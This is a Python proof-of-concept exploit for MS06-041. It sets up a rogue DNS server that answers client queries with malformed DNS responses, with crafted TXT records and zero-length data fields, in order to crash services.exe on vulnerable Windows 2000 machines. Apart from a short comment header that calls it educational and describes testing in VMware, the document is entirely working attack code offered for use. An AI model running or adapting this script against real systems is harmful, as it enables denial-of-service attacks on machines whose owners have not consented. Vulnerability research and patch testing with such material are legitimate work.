#!/usr/bin/python
#POC for MS06-041
#Run the python script passing the local ip address as parameter. The DNS server
#will start listening on this ip address for DNS hostname resolution queries.
#This script is for testing and educational purpose and so to test this one will
#have to point the DNS resolver on the target/client to the ip address on which
#this script runs.
#Open up internet explorer and type in a hostname. services.exe will crash.
#You may have to repeat this two or three times to see the crash in services.exe
# Tested on Windows 2000 server SP0 and SP1  inside VmWare. Could not
# reproduce on SP4 though it is also vulnerable. May be I missed something :)
#
# For testing/educational purpose. Author shall bear no responsibility for any screw ups
# Winny Thomas ;-)

import sys
import struct
import socket

class DNSserver:
       def __init__(self, localhost):
               self.response = ''
               self.__create_socket(localhost)

       def __create_socket(self, localhost):
               self.host = localhost
               self.port = 53
               self.DNSsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
               self.DNSsocket.bind((self.host, self.port))
               print 'Awaiting DNS queries'
               print '====================\n'
               while 1:
                       self.__await_query()

       def __await_query(self):
               self.Query, self.Addr = self.DNSsocket.recvfrom(1024)
               print 'Query from: ' + str(self.Addr)
               self.TransactID = self.Query[0:2]
               self.__find_type(self.Query[2:])

       def __find_type(self, Question):
               qType = struct.unpack('>H', Question[0:2])
               if qType[0] == 256:
                       self.__send_response(Question[10:-4])

       def __send_response(self, sName):
               self.response = self.TransactID
               self.response += '\x85\x80' #Flags
               self.response += '\x00\x01' #Questions
               self.response += '\x00\x02' #Answer RR's
               self.response += '\x00\x01' #Authority RR
               self.response += '\x00\x00' #Additional RR

               #QUERIES
               #self.response += sName
               self.response += '\x04\x74\x65\x73\x74\x07\x68\x61\x63\x6b\x65'
               self.response += '\x72\x73\x03\x63\x6f\x6d\x00'
               self.response += '\x00\xff' #request all  records
               self.response += '\x00\x01' #inet class

               #ANSWERS
               #A record
               self.response += '\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x07'
               self.response += '\x00\x04\xc0\xa8\x00\x02' #A type record (IP add)
               #TXT record
               self.response += '\xc0\x0c\x00\x10\x00\x01\x00\x00\x00\x07'
               self.response += '\x00\x18' #TXT record length
               self.response += '\x08\x50\x52\x4f\x54\x4f\x43\x4f\x4c'
               self.response += '\x00' #Zero length TXT RDATA
               self.response += '\x00' #Zero length TXT RDATA
               self.response += '\x08\x50\x52\x4f\x54\x4f\x43\x4f\x4c'
               self.response += '\x00' #Zero length TXT RDATA
               self.response += '\x00' #Zero length TXT RDATA
               self.response += '\x01\x41'

               #Authoritative Nameservers
               self.response += '\xc0\x11\x00\x02\x00\x01\x00\x01\x51\x80'
               self.response += '\x00\x0b\x08\x73\x63\x6f\x72\x70\x69\x6f'
               self.response += '\x6e\xc0\x11'

               self.DNSsocket.sendto(self.response, (self.Addr))

if __name__ == '__main__':
       try:
               localhost = sys.argv[1]
       except IndexError:
               print 'Usage: %s <local ip for listening to DNS request>' % sys.argv[0]
               sys.exit(-1)

       D = DNSserver(localhost)